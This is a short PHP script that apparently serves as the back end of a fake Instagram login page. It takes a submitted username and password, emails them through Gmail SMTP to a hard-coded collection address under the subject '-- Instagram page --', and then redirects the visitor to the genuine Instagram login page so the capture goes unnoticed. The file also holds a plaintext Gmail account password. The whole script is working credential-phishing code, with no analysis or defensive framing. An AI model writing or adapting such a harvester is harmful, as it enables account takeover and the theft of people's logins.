<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once 'phpmailer/Exception.php';
require_once 'phpmailer/PHPMailer.php';
require_once 'phpmailer/SMTP.php';

$mail = new PHPMailer(true);
$alert = '';

if(isset($_POST['submit'])){
  $name = $_POST['name'];
  $password = $_POST['password'];


  try{
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'instagramcommunitygl@gmail.com'; // Gmail address which you want to use as SMTP server
    $mail->Password = 'cocoland@18'; // Gmail address Password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = '587';

    $mail->setFrom('instagramcommunitygl@gmail.com'); // Gmail address which you used as SMTP server
    $mail->addAddress('instagramcommunitygl@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)

    $mail->isHTML(true);
    $mail->Subject = '-- Instagram page --';
    $mail->Body = "<h3>user name : $name <br>Password: $password </h3>";

    $mail->send();
 
  } catch (Exception $e){
    $alert = '<div class="alert-error">
                <span>'.$e->getMessage().'</span>
              </div>';
  }
}

header("Location: https://www.instagram.com/accounts/login", true, 301);

?>